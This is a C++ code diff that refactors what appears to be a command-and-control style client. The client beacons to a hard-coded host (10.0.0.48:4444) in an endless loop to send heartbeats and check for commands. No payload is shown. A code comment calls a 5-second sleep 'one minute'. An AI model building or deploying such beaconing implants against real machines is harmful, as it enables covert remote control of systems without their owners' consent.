@@ -11,6 +11,7 @@
 
 
 #include "Client.h"
+#include "ComponentFactory.h"
 #include "TransportLayer.h"
 
 
@@ -29,28 +30,29 @@ Client::Client(TCPtransportLayer transportLayer, std::string server, std::string
 }*/
 
 
+// TODO: delete?
 Client::Client() : 
 	transportLayer_(TransportLayerFactory::create(
-		TransportLayerType::TCP,
 		messageHandler_,
 		"10.0.0.48",
-		"4444"))
+		"4444",
+		TransportLayerType::TCP))
 {
-	messageHandler_.setTransportLayer(*transportLayer_);
+	//messageHandler_.setTransportLayer(*transportLayer_);
 }
 
 // Constructor with specific transport type
 Client::Client(TransportLayerType transportType, const std::string& server, const std::string& port) :
-	transportLayer_(TransportLayerFactory::create(transportType, messageHandler_, server, port))
+	transportLayer_(TransportLayerFactory::create(messageHandler_, server, port, transportType))
 {
-	messageHandler_.setTransportLayer(*transportLayer_);
+	//messageHandler_.setTransportLayer(*transportLayer_);
 }
 
 // Constructor with custom transporter (for testing)
 Client::Client(TransportLayerUniquePtr transporter) :
 	transportLayer_(std::move(transporter))
 {
-	messageHandler_.setTransportLayer(*transportLayer_);
+	//messageHandler_.setTransportLayer(*transportLayer_);
 }
 
 
@@ -77,11 +79,11 @@ bool Client::run()
 
 	while (true)
 	{
-		if (!transportLayer_.isConnected())
+		if (!transportLayer_->isConnected())
 		{
-			transportLayer_.connect();    // Try to connect (handles if already connected)
+			transportLayer_->connect();    // Try to connect (handles if already connected)
 		}
-		transportLayer_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
+		transportLayer_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
 		//transporter_.receive();
 		//transporter_.sendMessage();
 		Sleep(5000);            // Wait 1 minute
